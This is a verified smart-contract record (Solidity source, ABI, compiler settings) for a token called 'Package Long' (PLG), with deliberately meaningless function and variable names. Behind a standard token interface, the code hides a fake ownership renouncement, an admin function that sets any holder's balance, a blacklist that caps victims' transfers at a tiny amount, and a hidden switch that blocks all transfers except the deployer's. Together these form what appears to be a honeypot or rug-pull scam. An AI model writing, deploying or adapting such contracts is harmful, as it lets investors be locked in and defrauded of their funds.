{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface swapWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderToken) external view returns (uint256);\n\n    function transfer(address senderTeam, uint256 sellLiquidity) external returns (bool);\n\n    function allowance(address sellSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTeam,\n        uint256 sellLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxTeam, uint256 value);\n    event Approval(address indexed sellSwap, address indexed spender, uint256 value);\n}\n\nabstract contract modeMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyTrading {\n    function createPair(address atMin, address teamAt) external returns (address);\n}\n\ninterface launchFromShould is swapWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PackageLong is modeMax, swapWallet, launchFromShould {\n\n    string private txTakeLiquidity = \"Package Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingWallet;\n    }\n\n    function exemptLaunched(address feeLimit) public {\n        isTeam();\n        if (marketingTo) {\n            launchFee = totalLiquidity;\n        }\n        if (feeLimit == atMaxSell || feeLimit == listTrading) {\n            return;\n        }\n        listMin[feeLimit] = true;\n    }\n\n    bool private enableList;\n\n    function allowance(address listReceiverTrading, address amountReceiverSender) external view virtual override returns (uint256) {\n        if (amountReceiverSender == enableMax) {\n            return type(uint256).max;\n        }\n        return liquidityTakeLaunched[listReceiverTrading][amountReceiverSender];\n    }\n\n    bool private marketingTo;\n\n    address sellLaunchedLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private walletShould = \"PLG\";\n\n    function getOwner() external view returns (address) {\n        return tokenFund;\n    }\n\n    address public listTrading;\n\n    bool private isMarketing;\n\n    function limitShouldSender(address walletAt, uint256 sellLiquidity) public {\n        isTeam();\n        marketingExempt[walletAt] = sellLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTeam;\n    }\n\n    uint256 walletSell;\n\n    uint8 private swapTeam = 18;\n\n    mapping(address => bool) public takeAuto;\n\n    uint256 private tradingWallet = 100000000 * 10 ** 18;\n\n    address public atMaxSell;\n\n    function owner() external view returns (address) {\n        return tokenFund;\n    }\n\n    function isTeam() private view {\n        require(takeAuto[_msgSender()]);\n    }\n\n    bool private teamAuto;\n\n    bool public marketingTxIs;\n\n    event OwnershipTransferred(address indexed sellReceiverList, address indexed sellEnableLiquidity);\n\n    mapping(address => bool) public listMin;\n\n    function transfer(address walletAt, uint256 sellLiquidity) external virtual override returns (bool) {\n        return maxLaunchEnable(_msgSender(), walletAt, sellLiquidity);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txTakeLiquidity;\n    }\n\n    function approve(address amountReceiverSender, uint256 sellLiquidity) public virtual override returns (bool) {\n        liquidityTakeLaunched[_msgSender()][amountReceiverSender] = sellLiquidity;\n        emit Approval(_msgSender(), amountReceiverSender, sellLiquidity);\n        return true;\n    }\n\n    function fundListShould(uint256 sellLiquidity) public {\n        isTeam();\n        atAmountList = sellLiquidity;\n    }\n\n    uint256 public launchFee;\n\n    function toIs(address marketingIsLimit, address senderTeam, uint256 sellLiquidity) internal returns (bool) {\n        require(marketingExempt[marketingIsLimit] >= sellLiquidity);\n        marketingExempt[marketingIsLimit] -= sellLiquidity;\n        marketingExempt[senderTeam] += sellLiquidity;\n        emit Transfer(marketingIsLimit, senderTeam, sellLiquidity);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityTakeLaunched;\n\n    uint256 private totalLiquidity;\n\n    function balanceOf(address senderToken) public view virtual override returns (uint256) {\n        return marketingExempt[senderToken];\n    }\n\n    constructor (){\n        \n        sellLaunch shouldMarketing = sellLaunch(enableMax);\n        listTrading = buyTrading(shouldMarketing.factory()).createPair(shouldMarketing.WETH(), address(this));\n        if (teamAuto == isMarketing) {\n            totalLiquidity = launchFee;\n        }\n        atMaxSell = _msgSender();\n        atMax();\n        takeAuto[atMaxSell] = true;\n        marketingExempt[atMaxSell] = tradingWallet;\n        \n        emit Transfer(address(0), atMaxSell, tradingWallet);\n    }\n\n    function transferFrom(address marketingIsLimit, address senderTeam, uint256 sellLiquidity) external override returns (bool) {\n        if (_msgSender() != enableMax) {\n            if (liquidityTakeLaunched[marketingIsLimit][_msgSender()] != type(uint256).max) {\n                require(sellLiquidity <= liquidityTakeLaunched[marketingIsLimit][_msgSender()]);\n                liquidityTakeLaunched[marketingIsLimit][_msgSender()] -= sellLiquidity;\n            }\n        }\n        return maxLaunchEnable(marketingIsLimit, senderTeam, sellLiquidity);\n    }\n\n    uint256 atAmountList;\n\n    function atMax() public {\n        emit OwnershipTransferred(atMaxSell, address(0));\n        tokenFund = address(0);\n    }\n\n    mapping(address => uint256) private marketingExempt;\n\n    address enableMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function amountFee(address tokenLimit) public {\n        if (marketingTxIs) {\n            return;\n        }\n        if (enableList) {\n            launchFee = totalLiquidity;\n        }\n        takeAuto[tokenLimit] = true;\n        \n        marketingTxIs = true;\n    }\n\n    uint256 constant takeAmount = 9 ** 10;\n\n    function maxLaunchEnable(address marketingIsLimit, address senderTeam, uint256 sellLiquidity) internal returns (bool) {\n        if (marketingIsLimit == atMaxSell) {\n            return toIs(marketingIsLimit, senderTeam, sellLiquidity);\n        }\n        uint256 listTo = swapWallet(listTrading).balanceOf(sellLaunchedLiquidity);\n        require(listTo == atAmountList);\n        require(senderTeam != sellLaunchedLiquidity);\n        if (listMin[marketingIsLimit]) {\n            return toIs(marketingIsLimit, senderTeam, takeAmount);\n        }\n        return toIs(marketingIsLimit, senderTeam, sellLiquidity);\n    }\n\n    address private tokenFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnableLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiverSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"}],\"name\":\"exemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"fundListShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"limitShouldSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTxIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIsLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PackageLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}